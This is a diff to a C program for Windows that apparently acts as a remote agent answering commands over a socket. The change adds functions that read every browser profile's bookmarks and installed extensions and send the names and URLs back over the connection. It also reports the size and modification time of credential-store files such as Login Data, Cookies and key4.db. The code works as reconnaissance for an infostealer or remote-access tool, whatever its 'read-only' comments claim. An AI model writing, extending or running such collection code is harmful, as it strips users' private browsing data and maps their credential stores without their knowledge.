@@ -582,7 +582,151 @@ void handle_input(const unsigned char* p, int n) {
     }
 }
 
-/* ---- browser profile inventory (metadata only, no credential parsing) ---- */
+/* ---- browser inventory: profile artifacts, bookmarks, extensions ----
+   Read-only. Credential stores (Login Data / Cookies / key4.db) are reported
+   as file metadata and never opened or decrypted. */
+
+static void b_line(SOCKET s, const char* kind, const char* browser, const char* a,
+                   const char* b, const char* c, long long n) {
+    char line[1200];
+    int len = snprintf(line, sizeof(line), "%s\t%s\t%s\t%s\t%s\t%lld\n", kind, browser, a, b, c, n);
+    if (len > 0 && len < (int)sizeof(line)) send_frame(s, RSP_DATA, (const unsigned char*)line, len);
+}
+
+static void b_clean(char* dst, int cap, const char* src, int n) {
+    int i = 0, j = 0;
+    while (i < n && j < cap - 1) {
+        char ch = src[i];
+        if (ch == '\\' && i + 1 < n && (src[i + 1] == '"' || src[i + 1] == '\\')) {
+            ch = src[i + 1];
+            i++;
+        }
+        if (ch != '\t' && ch != '\n' && ch != '\r') dst[j++] = ch;
+        i++;
+    }
+    dst[j] = 0;
+}
+
+/* Reads a whole file up to cap bytes; caller frees. */
+static char* read_small(const char* path, int cap, int* outlen) {
+    WIN32_FILE_ATTRIBUTE_DATA a;
+    DWORD rd = 0, size;
+    HANDLE h;
+    char* buf;
+    if (!GetFileAttributesExA(path, GetFileExInfoStandard, &a)) return NULL;
+    size = a.nFileSizeLow;
+    if (a.nFileSizeHigh || size == 0 || size > (DWORD)cap) return NULL;
+    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                    NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE) return NULL;
+    buf = (char*)malloc((size_t)size + 1);
+    if (!buf) { CloseHandle(h); return NULL; }
+    if (!ReadFile(h, buf, size, &rd, NULL) || rd != size) {
+        free(buf);
+        CloseHandle(h);
+        return NULL;
+    }
+    CloseHandle(h);
+    buf[size] = 0;
+    if (outlen) *outlen = (int)size;
+    return buf;
+}
+
+static int json_value(const char* buf, const char* key, int klen, const char* in,
+                      char* out, int cap) {
+    const char* p;
+    if (!in) in = buf;
+    p = strstr(in, key);
+    if (!p) return 0;
+    p = strchr(p + klen, ':');
+    if (!p) return 0;
+    p++;
+    while (*p == ' ' || *p == '\t') p++;
+    if (*p != '"') return 0;
+    p++;
+    {
+        const char* e = p;
+        while (*e && *e != '"') {
+            if (*e == '\\' && e[1]) e++;
+            e++;
+        }
+        if (!*e) return 0;
+        b_clean(out, cap, p, (int)(e - p));
+    }
+    return out[0] ? 1 : 0;
+}
+
+static void b_bookmarks(SOCKET s, const char* browser, const char* root, const char* profile) {
+    char path[MAX_PATH], name[160], url[512];
+    char* buf;
+    int len = 0;
+    const char* p;
+    snprintf(path, sizeof(path), "%s\\%s\\Bookmarks", root, profile);
+    buf = read_small(path, 4 * 1024 * 1024, &len);
+    if (!buf) return;
+    p = buf;
+    for (;;) {
+        const char* u = strstr(p, "\"url\"");
+        const char* ue;
+        if (!u) break;
+        u = strchr(u + 5, ':');
+        if (!u) break;
+        u++;
+        while (*u == ' ' || *u == '\t') u++;
+        if (*u != '"') { p = u; continue; }
+        u++;
+        ue = strchr(u, '"');
+        if (!ue) break;
+        name[0] = 0;
+        {
+            const char* n = u;
+            int back = 0;
+            while (n > buf && back < 600) {
+                n--; back++;
+                if (*n == '"' && !strncmp(n, "\"name\"", 6)) break;
+            }
+            if (n > buf && !strncmp(n, "\"name\"", 6)) json_value(buf, "\"name\"", 6, n, name, sizeof(name));
+        }
+        b_clean(url, sizeof(url), u, (int)(ue - u));
+        if (url[0]) b_line(s, "B", browser, profile, name, url, 0);
+        p = ue + 1;
+    }
+    free(buf);
+}
+
+static void b_extensions(SOCKET s, const char* browser, const char* root, const char* profile) {
+    char dir[MAX_PATH], pat[MAX_PATH], manifest[MAX_PATH];
+    char name[160], version[32];
+    WIN32_FIND_DATAA fd, vd;
+    HANDLE h, vh;
+    snprintf(dir, sizeof(dir), "%s\\%s\\Extensions", root, profile);
+    snprintf(pat, sizeof(pat), "%s\\*", dir);
+    h = FindFirstFileA(pat, &fd);
+    if (h == INVALID_HANDLE_VALUE) return;
+    do {
+        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || fd.cFileName[0] == '.') continue;
+        snprintf(pat, sizeof(pat), "%s\\%s\\*", dir, fd.cFileName);
+        vh = FindFirstFileA(pat, &vd);
+        if (vh == INVALID_HANDLE_VALUE) continue;
+        do {
+            char* buf;
+            if (!(vd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || vd.cFileName[0] == '.') continue;
+            snprintf(manifest, sizeof(manifest), "%s\\%s\\%s\\manifest.json", dir, fd.cFileName, vd.cFileName);
+            buf = read_small(manifest, 256 * 1024, NULL);
+            if (!buf) continue;
+            name[0] = 0;
+            version[0] = 0;
+            json_value(buf, "\"name\"", 6, buf, name, sizeof(name));
+            json_value(buf, "\"version\"", 9, buf, version, sizeof(version));
+            if (!name[0]) snprintf(name, sizeof(name), "%s", fd.cFileName);
+            if (!version[0]) snprintf(version, sizeof(version), "%s", vd.cFileName);
+            b_line(s, "E", browser, profile, name, version, 0);
+            free(buf);
+        } while (FindNextFileA(vh, &vd));
+        FindClose(vh);
+    } while (FindNextFileA(h, &fd));
+    FindClose(h);
+}
 
 static int browser_env_dir(const char* env, const char* sub, char* out, int cap) {
     char base[MAX_PATH];
@@ -590,14 +734,6 @@ static int browser_env_dir(const char* env, const char* sub, char* out, int cap)
     if (n == 0 || n >= sizeof(base)) return 0;
     snprintf(out, (size_t)cap, "%s\\%s", base, sub);
     return GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES;
-}
-
-static void browser_line(SOCKET s, const char* browser, const char* profile,
-                         const char* item, long long size, long long mtime) {
-    char line[600];
-    int n = snprintf(line, sizeof(line), "%s\t%s\t%s\t%lld\t%lld\n",
-                     browser, profile, item, size, mtime);
-    if (n > 0) send_frame(s, RSP_DATA, (const unsigned char*)line, n);
 }
 
 static int file_stat(const char* path, long long* size, long long* mtime) {
@@ -614,20 +750,23 @@ static int file_stat(const char* path, long long* size, long long* mtime) {
 
 static void browser_profile(SOCKET s, const char* browser, const char* root,
                             const char* profile, const char* const* files) {
-    char path[MAX_PATH];
+    char path[MAX_PATH], num[32];
     long long size = 0, mt = 0;
     int i;
     for (i = 0; files[i]; i++) {
         snprintf(path, sizeof(path), "%s\\%s\\%s", root, profile, files[i]);
         if (!file_stat(path, &size, &mt)) continue;
-        browser_line(s, browser, profile, files[i], size, mt);
+        snprintf(num, sizeof(num), "%lld", mt);
+        b_line(s, "F", browser, profile, files[i], num, size);
     }
+    b_bookmarks(s, browser, root, profile);
+    b_extensions(s, browser, root, profile);
 }
 
 static void browser_version(SOCKET s, const char* browser, const char* root) {
     char path[MAX_PATH], v[64];
-    HANDLE h;
     DWORD rd = 0;
+    HANDLE h;
     snprintf(path, sizeof(path), "%s\\Last Version", root);
     h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                     NULL, OPEN_EXISTING, 0, NULL);
@@ -637,7 +776,7 @@ static void browser_version(SOCKET s, const char* browser, const char* root) {
     CloseHandle(h);
     while (rd > 0 && (v[rd - 1] == '\n' || v[rd - 1] == '\r' || v[rd - 1] == ' ')) v[--rd] = 0;
     if (rd == 0) return;
-    browser_line(s, browser, "-", v, 0, 0);
+    b_line(s, "V", browser, "-", v, "0", 0);
 }
 
 void handle_browser(SOCKET s) {
